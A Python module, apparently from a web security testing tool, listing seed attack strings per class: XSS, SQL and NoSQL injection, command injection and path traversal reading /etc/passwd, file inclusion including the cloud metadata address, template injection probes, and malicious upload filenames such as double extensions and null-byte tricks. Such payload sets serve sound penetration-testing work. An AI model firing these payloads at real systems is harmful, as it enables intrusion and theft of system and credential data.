"""Built-in seed payloads per attack class.

These are canonical, well-known attack strings used to *start* a bypass search.
This is a minimal bootstrap set; the versioned, auto-updating knowledge base
(roadmap) will supersede and extend it.
"""
from __future__ import annotations

SEEDS: dict[str, list[str]] = {
    "XSS Injection": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "\"><svg/onload=alert(1)>",
        "javascript:alert(1)",
    ],
    "SQL Injection": [
        "' OR 1=1-- -",
        "1 UNION SELECT username,password FROM users",
        "' OR '1'='1",
        "admin'-- -",
    ],
    "Command Injection": [
        "; cat /etc/passwd",
        "| id",
        "$(whoami)",
        "`id`",
    ],
    "Directory Traversal": [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "/var/www/../../etc/passwd",
    ],
    "File Inclusion": [
        "php://filter/convert.base64-encode/resource=index.php",
        "/etc/passwd",
        "http://169.254.169.254/latest/meta-data/",
    ],
    "SSTI": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
    ],
    "NoSQL Injection": [
        "' || '1'=='1",
        "{\"$gt\": \"\"}",
    ],
    # Use with Target(inject="upload", param=<multipart field name>) against a real
    # upload endpoint — these are filenames/extensions, not injection strings. Confirmed
    # live (2026-11) that an unfiltered endpoint accepts all of these identically to a
    # benign .pdf; see docs/VALIDATION.md.
    "Upload Insecure Files": [
        "phtml", "phar", "php", "php3", "php4", "php5", "php7", "pht", "phtm",
        "shtml", "asp", "aspx", "jsp", "jspx", "cgi", "exe", "svg", "html", "htaccess",
        "shell.php.jpg",       # double extension
        "shell.PhP",           # case variation
        "shell.php;.jpg",      # Apache multiviews / semicolon trick
        "shell.php%00.jpg",    # legacy null-byte trick
        "shell.pHtMl",
    ],
}


def classes() -> list[str]:
    return list(SEEDS.keys())


def seeds_for(attack_class: str) -> list[str]:
    return SEEDS.get(attack_class, [])
